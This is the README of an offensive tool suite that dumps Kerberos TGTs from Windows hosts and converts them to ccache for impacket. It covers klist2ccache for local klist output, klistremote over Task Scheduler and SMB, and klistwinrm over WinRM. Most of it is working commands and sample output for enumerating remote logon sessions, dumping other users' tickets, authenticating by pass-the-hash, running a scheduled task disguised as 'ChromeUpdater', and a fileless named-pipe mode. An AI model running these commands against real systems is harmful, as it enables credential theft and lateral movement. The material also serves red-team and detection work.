# klist

Windows' built-in `klist` binary supports dumping Kerberos TGTs. **klist2ccache** converts that output to ccache format for use with impacket and other Linux Kerberos tooling. **klistremote** does the same thing remotely via Task Scheduler + SMB. **klistwinrm** does the same thing remotely via WinRM.

---

## klist2ccache

Use when you already have `klist tgt` output from a shell on the target.

```bash
python klist2ccache.py -i tgt.txt
```

```
[*] Parsed ticket:
    client     : jotter@LUMON.COM
    server     : krbtgt/LUMON.COM@LUMON.COM
    key_type   : 18
    key        : 74f62dc212216c910b<SNIP>
    flags      : 0x40e10000
    start_time : 2026-03-06 17:44:00+00:00
    end_time   : 2026-03-07 03:44:00+00:00
    renew_till : 2026-03-13 08:13:41+00:00
    ticket     : 1229 bytes

[+] ccache written → jotter@LUMON.COM.ccache  (1450 bytes)

[*] Use with impacket:
    export KRB5CCNAME=jotter@LUMON.COM.ccache
    smbclient.py -k -no-pass LUMON/jotter@target
```

---

## klistremote

Use when you have credentials to a Windows host and want to dump TGTs without an interactive shell. Same auth format as other Impacket tools.

Default mode writes output to a temp file on the target (`C:\ProgramData\`), reads it via `C$`, then deletes it. Use **`-named-pipes`** to stream over SMB IPC$ instead — no files on disk.

```bash
# List sessions
python klistremote.py list LUMON/admin@target
python klistremote.py list LUMON/admin@target --computer   # include machine accounts

# Dump all sessions
python klistremote.py dump LUMON/admin@target -o ./ccaches

# Dump a specific session (1-based index from list)
python klistremote.py dump LUMON/admin@target -s 1 -o ./ccaches

# Pass-the-hash
python klistremote.py list -hashes :NTHASH user@target

# Kerberos auth
python klistremote.py list -k LUMON/user@target

# No files on disk (PowerShell named pipe)
python klistremote.py list -named-pipes -hashes :NTHASH user@target
python klistremote.py dump -named-pipes -hashes :NTHASH user@target -o ./ccaches
```

Example — list then dump session 1:

```
$ python klistremote.py list LUMON/admin@10.10.10.5
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[!] This will work ONLY on Windows >= Vista
[*] Connecting to 10.10.10.5 ...
[*] Enumerating remote Kerberos sessions ...
[*]   task: \ChromeUpdater  file: ChromeUpdater_48291.dat

  Kerberos sessions on 10.10.10.5:

  [1]  LUMON\jotter  0x154333

$ python klistremote.py list LUMON/admin@10.10.10.5 --computer

  Kerberos sessions on 10.10.10.5:

  [1]  LUMON\jotter      0x154333
  [2]  LUMON\jotter-pc$  0x3e4

$ python klistremote.py dump LUMON/admin@10.10.10.5 -s 1 -o ./ccaches
...
[*] [1/1] LUMON\jotter (0x154333) ...
[*]   -> ./ccaches/jotter@LUMON.COM.ccache
[*] Done. 1 ccache(s) written to ./ccaches
```

```bash
export KRB5CCNAME=./ccaches/jotter@LUMON.COM.ccache
impacket-smbclient -k -no-pass LUMON/jotter@target
```

---

## klistwinrm

Same as klistremote but uses WinRM instead of Task Scheduler + SMB. Simpler setup — no SMB required, just WinRM (port 5985/5986) open on the target.

```bash
pip install pywinrm
pip install requests-ntlm2  # optional: pass-the-hash support
```

```bash
# List sessions
python klistwinrm.py list LUMON/admin@target
python klistwinrm.py list LUMON/admin@target --computer   # include machine accounts

# Dump all sessions
python klistwinrm.py dump LUMON/admin@target -o ./ccaches

# Dump a specific session
python klistwinrm.py dump LUMON/admin@target -s 1 -o ./ccaches

# Pass-the-hash (requires requests-ntlm2)
python klistwinrm.py list -hashes :NTHASH user@target

# Kerberos auth
python klistwinrm.py list -k LUMON/user@target

# HTTPS / custom port
python klistwinrm.py list LUMON/admin@target -ssl
python klistwinrm.py list LUMON/admin@target -port 5986 -ssl
```

| Flag | klistremote | klistwinrm |
|------|-------------|------------|
| Password (NTLM) | ✓ | ✓ |
| `-hashes :NTHASH` (PTH) | ✓ | ✓ (needs requests-ntlm2) |
| `-k` (Kerberos ccache) | ✓ | ✓ |
| `-aesKey` | ✓ | ✓ (get TGT first via getTGT.py) |
| `-keytab` | ✓ | ✓ |
| `--computer` | ✓ | ✓ |
| `-named-pipes` | ✓ | — |
| `-ssl` / `-port` | — | ✓ |
